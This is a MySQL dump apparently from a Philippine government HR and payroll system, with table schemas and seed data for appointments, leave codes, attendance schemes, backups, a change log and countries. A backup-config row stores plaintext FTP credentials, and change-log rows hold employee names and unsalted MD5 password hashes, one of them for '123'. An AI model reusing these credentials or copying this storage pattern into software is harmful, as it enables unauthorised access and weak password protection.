INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PromTran', 'PromotionTransfer', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('E', 'Elective', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Proj', 'Project Based', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Trainee', 'Trainee', '', 'N', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Reg', 'Regular', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('O', 'Others', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('SE', 'Secondment', '', 'Y', '', '1', '0');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PC1', 'Conferred the rank of Scientist I', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PC2', 'Conferred the rank of Scientist II', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PC3', 'Conferred the rank of Scientist III', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PC4', 'Conferred the rank of Scientist IV', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('PC5', 'Conferred the rank of Scientist V', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('CTI', 'Co-Terminous with the Incumbent', '', 'Y', '', '1', '1');
INSERT INTO `tblappointment` (`appointmentCode`, `appointmentDesc`, `header`, `leaveEntitled`, `paymentBasis`, `system`, `incPlantilla`) VALUES ('Int', 'Intern', '', 'Y', '', '0', '0');


#
# TABLE STRUCTURE FOR: tblattendancecode
#

DROP TABLE IF EXISTS `tblattendancecode`;

CREATE TABLE `tblattendancecode` (
  `code` varchar(5) NOT NULL DEFAULT '',
  `name` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`code`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('PL', 'Privilege Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('VL', 'Vacation Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('SL', 'Sick Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('PTL', 'Paternity Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('ML', 'Maternity Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('FL', 'Force Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('STL', 'Study Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('HFL', 'Half-day Force Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('HPL', 'Half-day Privilege Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('HVL', 'Half-day Vacation Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('HSL', 'Half-day Sick Leave');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('OB', 'Official Business');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('QB', 'Quasi Official Business');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('OT', 'Overtime');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('TO', 'Travel Order');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('TT', 'Trip Ticket');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('MET', 'Meeting');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('FC', 'Flag Ceremony');
INSERT INTO `tblattendancecode` (`code`, `name`) VALUES ('OFF', 'Offset');


#
# TABLE STRUCTURE FOR: tblattendancescheme
#

DROP TABLE IF EXISTS `tblattendancescheme`;

CREATE TABLE `tblattendancescheme` (
  `schemeCode` varchar(5) NOT NULL DEFAULT '',
  `schemeName` varchar(255) NOT NULL DEFAULT '',
  `schemeType` varchar(20) NOT NULL DEFAULT '',
  `amTimeinFrom` time NOT NULL DEFAULT '00:00:00',
  `amTimeinTo` time NOT NULL DEFAULT '00:00:00',
  `pmTimeoutFrom` time NOT NULL DEFAULT '00:00:00',
  `pmTimeoutTo` time NOT NULL DEFAULT '00:00:00',
  `nnTimeoutFrom` time NOT NULL DEFAULT '00:00:00',
  `nnTimeoutTo` time NOT NULL DEFAULT '00:00:00',
  `nnTimeinFrom` time NOT NULL DEFAULT '00:00:00',
  `nnTimeinTo` time NOT NULL DEFAULT '00:00:00',
  `overtimeStarts` time NOT NULL DEFAULT '00:00:00',
  `overtimeEnds` time NOT NULL DEFAULT '00:00:00',
  `gracePeriod` int(11) NOT NULL DEFAULT 0,
  `gpLeaveCredits` char(1) NOT NULL DEFAULT 'Y',
  `gpLate` char(1) NOT NULL DEFAULT 'N',
  `wrkhrLeave` int(11) NOT NULL DEFAULT 0,
  `hlfLateUnd` char(1) NOT NULL DEFAULT 'N',
  `fixMonday` char(1) NOT NULL,
  PRIMARY KEY (`schemeCode`),
  KEY `schemeName` (`schemeName`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblattendancescheme` (`schemeCode`, `schemeName`, `schemeType`, `amTimeinFrom`, `amTimeinTo`, `pmTimeoutFrom`, `pmTimeoutTo`, `nnTimeoutFrom`, `nnTimeoutTo`, `nnTimeinFrom`, `nnTimeinTo`, `overtimeStarts`, `overtimeEnds`, `gracePeriod`, `gpLeaveCredits`, `gpLate`, `wrkhrLeave`, `hlfLateUnd`, `fixMonday`) VALUES ('GEN', 'General', 'Sliding', '06:00:00', '10:00:00', '04:00:00', '05:00:59', '12:00:00', '01:00:59', '12:00:00', '01:00:59', '00:00:00', '00:00:00', '0', 'N', 'N', '0', 'N', 'Y');
INSERT INTO `tblattendancescheme` (`schemeCode`, `schemeName`, `schemeType`, `amTimeinFrom`, `amTimeinTo`, `pmTimeoutFrom`, `pmTimeoutTo`, `nnTimeoutFrom`, `nnTimeoutTo`, `nnTimeinFrom`, `nnTimeinTo`, `overtimeStarts`, `overtimeEnds`, `gracePeriod`, `gpLeaveCredits`, `gpLate`, `wrkhrLeave`, `hlfLateUnd`, `fixMonday`) VALUES ('FIX', 'Fixed', 'Fixed', '08:00:00', '08:00:00', '05:00:00', '05:00:00', '12:00:00', '01:00:00', '12:00:00', '01:00:00', '00:00:00', '00:00:00', '0', 'Y', 'Y', '0', 'Y', 'Y');
INSERT INTO `tblattendancescheme` (`schemeCode`, `schemeName`, `schemeType`, `amTimeinFrom`, `amTimeinTo`, `pmTimeoutFrom`, `pmTimeoutTo`, `nnTimeoutFrom`, `nnTimeoutTo`, `nnTimeinFrom`, `nnTimeinTo`, `overtimeStarts`, `overtimeEnds`, `gracePeriod`, `gpLeaveCredits`, `gpLate`, `wrkhrLeave`, `hlfLateUnd`, `fixMonday`) VALUES ('PMEDS', 'PMEDSO', ' Sliding', '06:00:00', '08:30:00', '15:00:00', '17:30:59', '11:00:00', '12:00:59', '11:00:00', '12:00:59', '00:00:00', '00:00:00', '0', 'N', 'N', '0', 'N', 'N');
INSERT INTO `tblattendancescheme` (`schemeCode`, `schemeName`, `schemeType`, `amTimeinFrom`, `amTimeinTo`, `pmTimeoutFrom`, `pmTimeoutTo`, `nnTimeoutFrom`, `nnTimeoutTo`, `nnTimeinFrom`, `nnTimeinTo`, `overtimeStarts`, `overtimeEnds`, `gracePeriod`, `gpLeaveCredits`, `gpLate`, `wrkhrLeave`, `hlfLateUnd`, `fixMonday`) VALUES ('SLIDI', 'FLEXI TIME', ' Sliding', '06:00:00', '06:00:00', '07:00:00', '11:00:00', '10:00:00', '12:00:00', '01:00:00', '07:00:00', '00:00:00', '00:00:00', '0', '', '', '0', '', 'Y');


#
# TABLE STRUCTURE FOR: tblattendancescheme_online_dtr
#

DROP TABLE IF EXISTS `tblattendancescheme_online_dtr`;

CREATE TABLE `tblattendancescheme_online_dtr` (
  `schemeCode` varchar(5) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `schemeName` varchar(255) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `schemeType` varchar(20) CHARACTER SET latin1 NOT NULL DEFAULT '',
  `amTimeinFrom` time NOT NULL DEFAULT '00:00:00',
  `amTimeinTo` time NOT NULL DEFAULT '00:00:00',
  `pmTimeoutFrom` time NOT NULL DEFAULT '00:00:00',
  `pmTimeoutTo` time NOT NULL DEFAULT '00:00:00',
  `nnTimeoutFrom` time NOT NULL DEFAULT '00:00:00',
  `nnTimeoutTo` time NOT NULL DEFAULT '00:00:00',
  `nnTimeinFrom` time NOT NULL DEFAULT '00:00:00',
  `nnTimeinTo` time NOT NULL DEFAULT '00:00:00',
  `overtimeStarts` time NOT NULL DEFAULT '00:00:00',
  `overtimeEnds` time NOT NULL DEFAULT '00:00:00',
  `gracePeriod` int(11) NOT NULL DEFAULT 0,
  `gpLeaveCredits` char(1) CHARACTER SET latin1 NOT NULL DEFAULT 'Y',
  `gpLate` char(1) CHARACTER SET latin1 NOT NULL DEFAULT 'N',
  `wrkhrLeave` int(11) NOT NULL DEFAULT 0,
  `hlfLateUnd` char(1) CHARACTER SET latin1 NOT NULL DEFAULT 'N',
  `fixMonday` char(1) CHARACTER SET latin1 NOT NULL,
  `allow30` char(1) NOT NULL,
  `strict` char(1) NOT NULL,
  PRIMARY KEY (`schemeCode`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

INSERT INTO `tblattendancescheme_online_dtr` (`schemeCode`, `schemeName`, `schemeType`, `amTimeinFrom`, `amTimeinTo`, `pmTimeoutFrom`, `pmTimeoutTo`, `nnTimeoutFrom`, `nnTimeoutTo`, `nnTimeinFrom`, `nnTimeinTo`, `overtimeStarts`, `overtimeEnds`, `gracePeriod`, `gpLeaveCredits`, `gpLate`, `wrkhrLeave`, `hlfLateUnd`, `fixMonday`, `allow30`, `strict`) VALUES ('FIX', 'Fixed', 'Fixed', '08:00:00', '08:00:00', '17:00:00', '17:00:00', '12:00:00', '13:00:00', '12:00:00', '13:00:59', '00:00:00', '00:00:00', '0', 'Y', 'Y', '0', 'Y', 'Y', 'N', 'N');
INSERT INTO `tblattendancescheme_online_dtr` (`schemeCode`, `schemeName`, `schemeType`, `amTimeinFrom`, `amTimeinTo`, `pmTimeoutFrom`, `pmTimeoutTo`, `nnTimeoutFrom`, `nnTimeoutTo`, `nnTimeinFrom`, `nnTimeinTo`, `overtimeStarts`, `overtimeEnds`, `gracePeriod`, `gpLeaveCredits`, `gpLate`, `wrkhrLeave`, `hlfLateUnd`, `fixMonday`, `allow30`, `strict`) VALUES ('GEN', 'General', 'Sliding', '07:00:00', '10:00:00', '16:00:00', '19:00:00', '12:00:00', '12:00:59', '12:00:00', '13:00:59', '00:00:00', '00:00:00', '0', 'N', 'N', '0', 'N', 'Y', 'N', 'N');
INSERT INTO `tblattendancescheme_online_dtr` (`schemeCode`, `schemeName`, `schemeType`, `amTimeinFrom`, `amTimeinTo`, `pmTimeoutFrom`, `pmTimeoutTo`, `nnTimeoutFrom`, `nnTimeoutTo`, `nnTimeinFrom`, `nnTimeinTo`, `overtimeStarts`, `overtimeEnds`, `gracePeriod`, `gpLeaveCredits`, `gpLate`, `wrkhrLeave`, `hlfLateUnd`, `fixMonday`, `allow30`, `strict`) VALUES ('PMEDS', 'PMEDSO', ' Sliding', '06:00:00', '08:30:00', '15:00:00', '17:30:59', '11:00:00', '12:00:59', '11:00:00', '12:00:59', '00:00:00', '00:00:00', '0', 'N', 'N', '0', 'N', 'N', 'N', 'N');


#
# TABLE STRUCTURE FOR: tblbackup
#

DROP TABLE IF EXISTS `tblbackup`;

CREATE TABLE `tblbackup` (
  `id` int(11) NOT NULL DEFAULT 0,
  `db_backup_name` varchar(100) NOT NULL DEFAULT '',
  `time_last_run` int(11) NOT NULL DEFAULT 0,
  `next_run_time` int(11) NOT NULL DEFAULT 0,
  `status` varchar(10) NOT NULL DEFAULT '',
  `xversion` varchar(6) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblbackup` (`id`, `db_backup_name`, `time_last_run`, `next_run_time`, `status`, `xversion`) VALUES ('1', '', '1256092556', '0', '', 'vers');


#
# TABLE STRUCTURE FOR: tblbackupconfig
#

DROP TABLE IF EXISTS `tblbackupconfig`;

CREATE TABLE `tblbackupconfig` (
  `id` int(11) NOT NULL DEFAULT 0,
  `time_interval` int(11) DEFAULT NULL,
  `fire_time` int(11) NOT NULL DEFAULT 0,
  `time_last_fired` int(11) NOT NULL DEFAULT 0,
  `email` varchar(50) NOT NULL DEFAULT '',
  `ftpadd` varchar(50) NOT NULL DEFAULT '',
  `ftpuname` varchar(20) NOT NULL DEFAULT '',
  `ftppass` varchar(20) NOT NULL DEFAULT '',
  `xtable` text NOT NULL,
  `xstatus` varchar(50) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblbackupconfig` (`id`, `time_interval`, `fire_time`, `time_last_fired`, `email`, `ftpadd`, `ftpuname`, `ftppass`, `xtable`, `xstatus`) VALUES ('1', '180000', '1304145940', '1303965940', 'ftp.dost.gov.ph', 'ftp.dost.gov.ph', 'admin', 'dost-admin', 'esessions,phpjobscheduler,phpjobscheduler_logs', '');


#
# TABLE STRUCTURE FOR: tblbackupscheduler
#

DROP TABLE IF EXISTS `tblbackupscheduler`;

CREATE TABLE `tblbackupscheduler` (
  `id` int(11) NOT NULL DEFAULT 0,
  `scriptpath` varchar(100) NOT NULL DEFAULT '',
  `time_interval` int(11) DEFAULT NULL,
  `fire_time` int(11) NOT NULL DEFAULT 0,
  `time_last_fired` int(11) DEFAULT NULL,
  `name` varchar(50) NOT NULL DEFAULT ''
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblbackupscheduler` (`id`, `scriptpath`, `time_interval`, `fire_time`, `time_last_fired`, `name`) VALUES ('0', '/home', '-604800', '1572241907', '0', 'Automatic');


#
# TABLE STRUCTURE FOR: tblbrokensched
#

DROP TABLE IF EXISTS `tblbrokensched`;

CREATE TABLE `tblbrokensched` (
  `rec_ID` int(10) unsigned zerofill NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  `schemeCode` varchar(5) NOT NULL DEFAULT '',
  `dateFrom` date NOT NULL DEFAULT '0000-00-00',
  `dateTo` date NOT NULL DEFAULT '0000-00-00',
  PRIMARY KEY (`rec_ID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblchangelog
#

DROP TABLE IF EXISTS `tblchangelog`;

CREATE TABLE `tblchangelog` (
  `changeLogId` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(30) NOT NULL DEFAULT '',
  `module` varchar(20) NOT NULL DEFAULT '',
  `tablename` varchar(30) NOT NULL DEFAULT '',
  `databaseevent` varchar(15) NOT NULL DEFAULT '',
  `date_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `description` longtext NOT NULL,
  `data` longtext NOT NULL,
  `data2` longtext NOT NULL,
  `ip` varchar(30) NOT NULL DEFAULT '',
  PRIMARY KEY (`changeLogId`)
) ENGINE=MyISAM AUTO_INCREMENT=7 DEFAULT CHARSET=latin1;

INSERT INTO `tblchangelog` (`changeLogId`, `empNumber`, `module`, `tablename`, `databaseevent`, `date_time`, `description`, `data`, `data2`, `ip`) VALUES ('1', '1111', 'HR Module', 'tblEmpPersonal', '', '2022-11-21 13:39:46', 'Added REP0902 Personal Information', 'REP0902;;Paano;Rashia Mae Deva;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;', '', '192.168.0.2');
INSERT INTO `tblchangelog` (`changeLogId`, `empNumber`, `module`, `tablename`, `databaseevent`, `date_time`, `description`, `data`, `data2`, `ip`) VALUES ('2', '1111', 'HR Module', 'tblempaccount', '', '2022-11-21 13:42:34', 'Added rmdep User_account', 'REP0902;rmdep;8f72d6b483f6a80e5e3aae3e8f8188b6;5;0;;employee;', '', '192.168.0.2');
INSERT INTO `tblchangelog` (`changeLogId`, `empNumber`, `module`, `tablename`, `databaseevent`, `date_time`, `description`, `data`, `data2`, `ip`) VALUES ('3', '1111', 'HR Module', 'tblempaccount', '', '2022-11-21 13:43:44', 'Added rmdep User_account', 'REP0902;rmdep;8f72d6b483f6a80e5e3aae3e8f8188b6;5;0;;employee;', '', '192.168.0.2');
INSERT INTO `tblchangelog` (`changeLogId`, `empNumber`, `module`, `tablename`, `databaseevent`, `date_time`, `description`, `data`, `data2`, `ip`) VALUES ('4', '1111', 'HR Module', 'tblEmpPersonal', '', '2024-01-09 08:55:15', 'Added ROCJ1010 Personal Information', 'ROCJ1010;;Cabaluna;Ruel;Ogao-ogao;O;Jr;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;', '', '::1');
INSERT INTO `tblchangelog` (`changeLogId`, `empNumber`, `module`, `tablename`, `databaseevent`, `date_time`, `description`, `data`, `data2`, `ip`) VALUES ('5', '1111', 'HR Module', 'tblempaccount', '', '2024-01-09 08:57:16', 'Added rocj User_account', 'ROCJ1010;rocj;202cb962ac59075b964b07152d234b70;5;0;;employee;', '', '::1');
INSERT INTO `tblchangelog` (`changeLogId`, `empNumber`, `module`, `tablename`, `databaseevent`, `date_time`, `description`, `data`, `data2`, `ip`) VALUES ('6', '1111', 'HR Module', 'tblempaccount', '', '2024-01-09 08:57:47', 'Added rocj User_account', 'ROCJ1010;rocj;202cb962ac59075b964b07152d234b70;5;0;;employee;', '', '::1');


#
# TABLE STRUCTURE FOR: tblcomputation
#

DROP TABLE IF EXISTS `tblcomputation`;

CREATE TABLE `tblcomputation` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fk_id` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(30) NOT NULL DEFAULT '',
  `code` varchar(20) NOT NULL DEFAULT '0',
  `amount` decimal(10,2) NOT NULL DEFAULT 0.00,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblcomputationdetails
#

DROP TABLE IF EXISTS `tblcomputationdetails`;

CREATE TABLE `tblcomputationdetails` (
  `fk_id` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  `periodMonth` int(11) NOT NULL DEFAULT 0,
  `periodYear` year(4) NOT NULL DEFAULT 0000,
  `workingDays` int(11) NOT NULL DEFAULT 0,
  `nodaysPresent` int(11) NOT NULL DEFAULT 0,
  `nodaysAbsent` int(11) NOT NULL DEFAULT 0,
  `hazardCode` varchar(20) NOT NULL DEFAULT '',
  `hazard` decimal(10,2) NOT NULL DEFAULT 0.00,
  `laundryCode` varchar(20) NOT NULL DEFAULT '',
  `laundry` decimal(10,2) NOT NULL DEFAULT 0.00,
  `subsisCode` varchar(20) NOT NULL DEFAULT '',
  `subsistence` decimal(10,2) NOT NULL DEFAULT 0.00,
  `salaryCode` varchar(20) NOT NULL DEFAULT '',
  `salary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `longi` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ra` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ta` decimal(10,2) NOT NULL DEFAULT 0.00,
  `hpFactor` int(11) NOT NULL DEFAULT 0,
  `ctr_8h` int(11) NOT NULL DEFAULT 0,
  `ctr_6h` int(11) NOT NULL DEFAULT 0,
  `ctr_5h` int(11) NOT NULL DEFAULT 0,
  `ctr_4h` int(11) NOT NULL DEFAULT 0,
  `ctr_wmeal` int(11) NOT NULL DEFAULT 0,
  `ctr_diem` decimal(10,2) NOT NULL DEFAULT 0.00,
  `ctr_laundry` int(11) NOT NULL DEFAULT 0,
  `rataAmount` decimal(10,2) NOT NULL DEFAULT 0.00,
  `rataVehicle` char(1) NOT NULL DEFAULT '',
  `rataCode` varchar(10) NOT NULL DEFAULT '',
  `daysWithVehicle` int(11) NOT NULL DEFAULT 0,
  `raPercent` int(11) NOT NULL DEFAULT 0,
  `taPercent` int(11) NOT NULL DEFAULT 0,
  `latest` enum('Y','N') NOT NULL DEFAULT 'N'
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblcomputationinstance
#

DROP TABLE IF EXISTS `tblcomputationinstance`;

CREATE TABLE `tblcomputationinstance` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `month` int(11) NOT NULL DEFAULT 0,
  `year` int(11) NOT NULL DEFAULT 0,
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `pmonth` int(11) NOT NULL DEFAULT 0,
  `pyear` int(11) NOT NULL DEFAULT 0,
  `status` int(11) NOT NULL DEFAULT 0,
  `totalNumDays` int(11) NOT NULL DEFAULT 0,
  `processed` int(11) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblcontact
#

DROP TABLE IF EXISTS `tblcontact`;

CREATE TABLE `tblcontact` (
  `agencyCode` varchar(10) NOT NULL DEFAULT '',
  `agency` varchar(255) NOT NULL DEFAULT '',
  `firstname` varchar(50) NOT NULL DEFAULT '',
  `middleInitial` char(1) NOT NULL DEFAULT '',
  `surname` varchar(50) NOT NULL DEFAULT '',
  `title` varchar(5) NOT NULL DEFAULT '',
  `position` varchar(255) NOT NULL DEFAULT '',
  `address` text NOT NULL,
  `phone` varchar(15) DEFAULT NULL,
  `email` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`agencyCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblcountry
#

DROP TABLE IF EXISTS `tblcountry`;

CREATE TABLE `tblcountry` (
  `countryId` int(11) NOT NULL AUTO_INCREMENT,
  `countryName` varchar(100) NOT NULL,
  `countryCode` varchar(80) NOT NULL,
  PRIMARY KEY (`countryId`)
) ENGINE=InnoDB AUTO_INCREMENT=212 DEFAULT CHARSET=latin1;

INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('1', '', '');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('2', 'Afghanistan', 'AFG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('3', 'Albania', 'ALB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('4', 'Algeria', 'DZA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('5', 'American Samoa', 'ASM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('6', 'Andorra', 'AND');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('7', 'Angola', 'AGO');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('8', 'Anguilla', 'AIA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('9', 'Antarctica', 'ATA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('10', 'Antigua and Barbuda', 'ATG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('11', 'Argentina', 'ARG');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('12', 'Armenia', 'ARM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('13', 'Aruba', 'ABW');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('14', 'Australia', 'AUS');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('15', 'Austria', 'AUT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('16', 'Azerbaijan', 'AZE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('17', 'Bahamas', 'BHS');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('18', 'Bahrain', 'BHR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('19', 'Bangladesh', 'BGD');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('20', 'Barbados', 'BRB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('21', 'Belarus', 'BLR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('22', 'Belgium', 'BEL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('23', 'Belize', 'BLZ');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('24', 'Benin', 'BEN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('25', 'Bermuda', 'BMU');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('26', 'Bhutan', 'BTN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('27', 'Bolivia', 'BOL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('28', 'Bosnia and Herzegovina', 'BIH');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('29', 'Botswana', 'BWA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('30', 'Brazil', 'BRA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('31', 'British Indian Ocean Territory', 'IOT');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('32', 'British Virgin Islands', 'VGB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('33', 'Brunei', 'BRN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('34', 'Bulgaria', 'BGR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('35', 'Burkina Faso', 'BFA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('36', 'Burundi', 'BDI');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('37', 'Cambodia', 'KHM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('38', 'Cameroon', 'CMR');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('39', 'Canada', 'CAN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('40', 'Central African Republic', 'CAF');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('41', 'Chad', 'TCD');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('42', 'Chile', 'CHL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('43', 'China', 'CHN');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('44', 'Cocos Islands', 'CCK');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('45', 'Colombia', 'COL');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('46', 'Cook Islands', 'COK');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('47', 'Costa Rica', 'CRI');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('48', 'Croatia', 'HRV');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('49', 'Cuba', 'CUB');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('50', 'Curacao', 'CUW');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('51', 'Czech Republic', 'CZE');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('52', 'Democratic Republic of the Congo', 'COD');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('53', 'Denmark', 'DNK');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('54', 'Dominica', 'DMA');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('55', 'Dominican Republic', 'DOM');
INSERT INTO `tblcountry` (`countryId`, `countryName`, `countryCode`) VALUES ('56', 'Ecuador', 'ECU');
